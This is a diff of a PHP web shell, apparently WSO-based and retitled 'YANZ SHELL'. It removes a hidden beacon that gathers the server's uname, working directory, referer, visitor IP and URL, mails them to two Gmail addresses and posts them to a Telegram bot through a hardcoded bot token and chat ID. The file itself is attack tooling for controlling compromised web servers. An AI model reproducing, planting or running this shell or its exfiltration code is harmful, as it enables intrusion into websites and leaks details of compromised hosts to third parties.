@@ -1,4 +1,4 @@
-<title>to be continue...</title>
+<title>YANZ SHELL</title>
 <?php
 $color = "6dff57";
 $default_use_ajax = true;
@@ -469,17 +469,6 @@ function actionSecInfo() {
     wsoFooter();
 	
 }
-
-$sys = php_uname(); 
-$lihat = getcwd(); 
-$jembut = $_SERVER['HTTP_REFERER'];
-$ip = getenv("REMOTE_ADDR");
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'yaniahh@gmail.com,ahhahh@gmail.com';
-$x_path = "IDBTE4M BOT V87 \r\n ".$jembut." \r\n " .$ip. " \nhttp://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n" . $lihat;
-mail($tujuanmail, $sys, $x_path);
-
-$sys = php_uname(); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "902596239:AAHewu44IM7D07QV-xSnHoa0qngyAxYStyA"; $data = [ 'chat_id' => '-1001291659226', 'text' => "http://$domen/$tempat \r\n $sys \r\n $home  \n" ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
 
 
 function actionPhp() {
